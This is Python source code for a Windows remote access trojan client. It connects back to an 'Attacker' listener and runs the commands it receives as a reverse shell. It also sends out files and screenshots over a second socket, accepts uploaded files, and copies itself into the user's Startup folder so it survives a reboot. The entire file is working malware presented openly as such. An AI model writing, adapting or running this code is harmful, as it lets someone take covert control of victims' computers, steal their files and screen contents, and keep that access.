import socket
from getpass import getuser
import sys
import shutil as shot
from random import randint
import time
from socket import *
from winsound import Beep
import pywhatkit as screen
import os
import subprocess


buf=1024*1024
host='127.0.0.1'
port=1212

s=socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print('[+] Connected To * Attacker * ')

cwd=os.getcwd().encode()
s.send(cwd)



#0 shell
while True:
    
    cmd=s.recv(buf).decode()
    splited=cmd.split()
    
    if splited[0].lower()=='cd':

        try:
            os.chdir(' '.join(splited[1:]))
        except FileNotFoundError as err:
            print(err)
    
    cwd=os.getcwd()
    sep="<sep>"
    command=subprocess.getoutput(cmd)
    
    message=f'{command}{sep}{cwd}'
    s.send(message.encode())
    
    
    # 1 Download files
    
    if splited[0].lower()=='down':
        
    
        
        def down():

            s1=socket(AF_INET, SOCK_STREAM)
            s1.connect(('127.0.0.1', 2626))
            print('[*] New Connection is Established . .')
            
            file=splited[1]
            f=open(file, 'rb')
            
            i=f.read(1024*1024)
            
            while (i):
                s1.send(i)
                i=f.read(1024*1024)
            
            s1.close()
            print('[*] Completed . .')
    
        down()
        
        
    # 2 Send Beep Message/Sound
    
    if splited[0].lower()=='beep':
    
        def beep():
            
            Beep(9873,1211)
            time.sleep(1)
            
        beep()
        

    #3 Screen Shot

    if splited[0].lower()=='screen':

        def screen_shot():
        
            name=str(randint(1,9999))
            screen.take_screenshot(name)
            file = os.getcwd()+f'\\{name}.png'
            
            s1=socket(AF_INET, SOCK_STREAM)
            s1.connect(('127.0.0.1', 2626))
            print('[*] New Connection is Established . .')
            
            f=open(file, 'rb')
            
            
            i=f.read(1024*128)
            while (i):
                s1.send(i)
                i=f.read(1024*128)
            
            s1.close()
            print('[*] Completed . .')
        
        screen_shot()
    
          
    #4 Upload Files
    
    def upload():

        if splited[0].lower()=='up':



            s1=socket(AF_INET, SOCK_STREAM)
            s1.bind(('0.0.0.0', 2626))
            
            s1.listen(1)
            sexy, address = s1.accept()
            print('[*] New Connection is Established . . Address: ',address)
            
            file=splited[1].split('\\')[-1]
            
            f=open(file, 'wb')
            
            i=1
            z=1024
            while True:
                
                
                while (i):
                
                    i=sexy.recv(1024*1024)
                    z=z*6
                    
                    while (i):
                    
                        f.write(i)
                        i=sexy.recv(1024*1024)

                        if  z < 1024*10 :pass
                break
            print(' <=-- Completed --=>')
            f.close()
            s1.close()
    upload()
            
            



    #5 Add to StartUp
    
    #C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    
    if splited[0].lower()=='startup':
        
        username=getuser() # Get the current username 
        startup=r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username) # StartUp Dir Path
        shot.copy(__file__, startup) # Copy This File To StartUp Directory Path
        
        Beep(1020, 80)
        Beep(1530, 100)
        Beep(2040, 1000)

            
        
        
